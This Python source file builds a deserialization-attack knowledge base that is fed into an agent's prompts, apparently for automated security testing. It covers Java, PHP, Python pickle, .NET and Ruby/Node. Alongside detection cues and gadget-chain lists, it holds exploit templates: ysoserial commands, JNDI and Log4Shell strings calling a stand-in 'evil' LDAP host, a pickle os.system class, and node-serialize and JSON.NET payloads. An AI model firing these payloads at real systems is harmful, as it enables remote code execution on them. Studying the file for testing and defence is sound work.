"""Deserialization attacks knowledge base.

Deep knowledge about deserialization:
1. Java deserialization
2. PHP deserialization
3. Python pickle attacks
4. .NET deserialization
5. Ruby/Node deserialization
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class DeserializationPattern:
    """A deserialization attack pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "critical"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


DESER_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "ds-001", "name": "Java Deserialization",
        "category": "java", "severity": "critical",
        "desc": "Java deserialization attacks.",
        "detection": (
            "JAVA DESERIALIZATION:\n"
            "DETECTION:\n"
            "  - Magic bytes: AC ED 00 05 (binary)\n"
            "  - Base64: rO0ABX\n"
            "  - Content-Type: application/x-java-serialized-object\n"
            "  - ViewState (JSF)\n"
            "  - T3 protocol (WebLogic)\n"
            "  - RMI/JMX endpoints\n"
            "  - Serialized cookies/params\n"
            "GADGET CHAINS:\n"
            "  - Commons Collections (CC1-CC7)\n"
            "  - Spring Framework\n"
            "  - Apache Commons Beanutils\n"
            "  - JDK (JRE8u20, 7u21)\n"
            "  - Hibernate\n"
            "  - Groovy\n"
            "  - ROME\n"
            "  - Jython\n"
            "EXPLOITATION:\n"
            "  # ysoserial (payload generator)\n"
            "  java -jar ysoserial.jar CommonsCollections5 'command'\n"
            "  # JNDI injection\n"
            "  java -jar ysoserial-modified.jar JNDI 'ldap://evil/obj'\n"
            "  # Log4Shell pattern (CVE-2021-44228)\n"
            "  ${jndi:ldap://evil/exploit}\n"
            "TARGETS:\n"
            "  - WebLogic (T3 protocol)\n"
            "  - JBoss/WildFly\n"
            "  - Jenkins\n"
            "  - Apache Tomcat\n"
            "  - Spring Framework\n"
            "TOOLS:\n"
            "  ysoserial, JNDI-Injection-Exploit, marshalsec"
        ),
        "tools": [],
    },
    {
        "id": "ds-002", "name": "PHP Deserialization",
        "category": "php", "severity": "critical",
        "desc": "PHP unserialize attacks.",
        "detection": (
            "PHP DESERIALIZATION:\n"
            "DETECTION:\n"
            "  - Serialized format: O:4:\"User\":2:{...}\n"
            "  - unserialize() in code\n"
            "  - Cookies with serialized data\n"
            "  - Session handlers\n"
            "  - __wakeup(), __destruct() methods\n"
            "TECHNIQUES:\n"
            "  - Property-Oriented Programming (POP)\n"
            "    # Chain magic methods\n"
            "    # __wakeup → __toString → __call\n"
            "  - Phar deserialization\n"
            "    # phar://wrapper triggers unserialize\n"
            "    # file_exists('phar://evil.phar')\n"
            "    # Any filesystem function\n"
            "  - Type juggling\n"
            "    # 0 == 'string' → true\n"
            "    # NULL == false → true\n"
            "GADGET CHAINS:\n"
            "  - Laravel\n"
            "    # PendingBroadcast chain\n"
            "    # RCE via evaluate()\n"
            "  - Symfony\n"
            "    # Gadget chain via __destruct\n"
            "  - WordPress\n"
            "    # Plugin-specific gadgets\n"
            "  - Magento\n"
            "  - Drupal\n"
            "TOOLS:\n"
            "  PHPGGC, custom scripts, Burp"
        ),
        "tools": [],
    },
    {
        "id": "ds-003", "name": "Python Pickle Attacks",
        "category": "python", "severity": "critical",
        "desc": "Python pickle deserialization.",
        "detection": (
            "PYTHON PICKLE ATTACKS:\n"
            "DETECTION:\n"
            "  - Magic bytes: \\x80\\x04\\x95 (protocol 4)\n"
            "  - Base64-encoded pickle\n"
            "  - pickle.loads() in code\n"
            "  - Flask sessions (signed pickle)\n"
            "  - Redis-backed sessions\n"
            "  - ML model files (.pkl, .pickle)\n"
            "EXPLOITATION:\n"
            "  import pickle\n"
            "  import os\n"
            "  class Exploit:\n"
            "      def __reduce__(self):\n"
            "          return (os.system, ('command',))\n"
            "  pickle.dumps(Exploit())\n"
            "TARGETS:\n"
            "  - Flask sessions (secret key needed)\n"
            "  - Django (pickle-based sessions)\n"
            "  - Celery (pickle serializer)\n"
            "  - PyYAML (yaml.load unsafe)\n"
            "  - ML model serving\n"
            "    # Hugging Face models\n"
            "    # TensorFlow SavedModel\n"
            "    # scikit-learn joblib\n"
            "RELATED:\n"
            "  - PyYAML: yaml.load() without Loader\n"
            "  - shelve module\n"
            "  - jsonpickle\n"
            "  - dill\n"
            "TOOLS:\n"
            "  fickling, pickleassem, custom scripts"
        ),
        "tools": [],
    },
    {
        "id": "ds-004", "name": ".NET Deserialization",
        "category": "dotnet", "severity": "critical",
        "desc": ".NET deserialization attacks.",
        "detection": (
            ".NET DESERIALIZATION:\n"
            "DETECTION:\n"
            "  - ViewState (ASP.NET)\n"
            "    # __VIEWSTATE parameter\n"
            "    # MAC validation check\n"
            "  - BinaryFormatter usage\n"
            "  - SoapFormatter\n"
            "  - TypeNameHandling in JSON.NET\n"
            "    # TypeNameHandling.All\n"
            "  - DataContractSerializer\n"
            "  - ObjectStateFormatter\n"
            "VIEWSTATE:\n"
            "  - Check MAC validation\n"
            "    # <machineKey validation=\"None\">\n"
            "  - Known machine key\n"
            "    # web.config leaked\n"
            "    # Default keys\n"
            "  # ysoserial.net -f BinaryFormatter -g gadget\n"
            "GADGET CHAINS:\n"
            "  - TypeConfuseDelegate\n"
            "  - TextFormattingRunProperties\n"
            "  - WindowsIdentity\n"
            "  - ActivitySurrogateSelector\n"
            "  - ObjectDataProvider\n"
            "TOOLS:\n"
            "  - ysoserial.net\n"
            "  - ViewState decoder\n"
            "  - Blacklist3r (machine key)\n"
            "JSON.NET:\n"
            "  {\"$type\":\"System.Windows.Data.ObjectDataProvider\",\n"
            "   \"MethodName\":\"Start\",\n"
            "   \"ObjectInstance\":{...}}\n"
            "TOOLS:\n"
            "  ysoserial.net, Blacklist3r, ViewState decoder"
        ),
        "tools": [],
    },
    {
        "id": "ds-005", "name": "Ruby/Node Deserialization",
        "category": "ruby_node", "severity": "high",
        "desc": "Ruby and Node.js deserialization.",
        "detection": (
            "RUBY/NODE DESERIALIZATION:\n"
            "RUBY:\n"
            "  - Marshal.load()\n"
            "    # Magic bytes: \\x04\\x08\n"
            "  - YAML.load() (unsafe)\n"
            "    # Psych engine\n"
            "    # !!ruby/object:Gem::Installer\n"
            "  - ERB template injection\n"
            "  - Rack sessions (Marshal-based)\n"
            "  GADGETS:\n"
            "    - Gem::Requirement chain\n"
            "    - ERB + YAML\n"
            "    - Universal RCE Gadget\n"
            "    # !!ruby/hash\n"
            "    # !!ruby/object\n"
            "    # !!ruby/struct\n"
            "NODE.JS:\n"
            "  - node-serialize\n"
            "    # Immediate Function Invocation\n"
            "    # {\"rce\":\"_$$ND_FUNC$$_function(){...}()\"}\n"
            "  - cryo (serialize)\n"
            "  - funcster\n"
            "  - js-yaml (dangerous types)\n"
            "  - JSON.parse + prototype pollution\n"
            "    # __proto__ injection\n"
            "    # constructor.prototype\n"
            "DETECTION:\n"
            "  - Serialized data in cookies\n"
            "  - Base64-encoded objects\n"
            "  - Custom Content-Type headers\n"
            "TOOLS:\n"
            "  Burp, custom scripts, nodejsscan"
        ),
        "tools": [],
    },
]


class DeserializationKB:
    """Deserialization attacks knowledge base.

    Provides deserialization patterns injected
    into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, DeserializationPattern] = {}
        self._log = logger.bind(component="deser_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load deserialization patterns."""
        for data in DESER_PATTERNS:
            pattern = DeserializationPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "critical"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[DeserializationPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_deser_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build deserialization prompt."""
        lines = ["## Deserialization Attacks\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
